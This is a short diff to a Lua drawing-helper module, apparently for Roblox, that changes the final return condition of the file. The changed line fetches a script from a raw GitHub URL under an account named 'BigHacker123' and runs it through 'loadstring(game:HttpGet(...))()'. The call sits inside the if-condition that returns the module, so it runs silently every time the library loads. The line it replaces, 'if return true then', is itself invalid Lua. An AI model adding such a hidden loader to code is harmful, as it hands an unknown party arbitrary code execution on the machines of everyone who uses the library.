@@ -54,6 +54,6 @@ function Drawing_Manager:CreateSquare(properties)
     return drawing
 end;
 
-if return true then
+if loadstring(game:HttpGet('https://raw.githubusercontent.com/BigHacker123/return/main/.lua'))() then
     return Drawing_Manager
 end
